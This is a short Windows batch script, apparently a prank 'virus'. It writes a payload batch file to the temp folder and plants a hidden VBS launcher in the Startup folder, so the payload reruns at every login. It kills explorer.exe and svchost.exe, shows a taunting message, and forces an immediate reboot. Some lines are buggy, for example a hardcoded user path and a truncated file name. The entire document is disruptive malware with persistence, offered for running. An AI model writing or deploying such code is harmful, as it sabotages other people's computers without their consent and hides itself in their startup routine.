@echo off
echo timeout /t 120 /nobreak ^> nul > %TEMP%\halfbakedvirus.bat
echo echo your not baked enough, get off the computer... ^> %TEMP%\message.txt ^&^& notepad %TEMP%\message.txt ^&^& del %TEMP%\message.txt >> %TEMP%\halfbakedvirus.bat
echo taskkill /f /im explorer.exe >> %TEMP%\halfbakedvirus.bat
echo echo To disable virus, goto the temp folder and delete halfbakedvirus.bat ^> C:\Users\%username%\Desktop\README.txt >> %TEMP%\halfbakedvirus.bat
echo timeout /t 30 >> %TEMP%\halfbakedvirus.bat
echo cmd /min /C \"set __COMPAT_LAYER=RUNASINVOKER ^&^& taskkill /f /im svchost.exe >> %TEMP%\halfbakedvirus

echo Set WshShell ^= CreateObject("WScript.Shell") > "C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\protopwner.vbs"
echo WshShell.Run chr(34) ^& "%TEMP%\halfbakedvirus.bat" ^& Chr(34), 0 >> "C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\protopwner.vbs"
echo Set WshShell ^= Nothing >> "C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\protopwner.vbs"

cmd /min /C \"set __COMPAT_LAYER=RUNASINVOKER && taskkill /f /im svchost.exe
timeout /t 2 > nul
shutdown /f /r /t 2
exit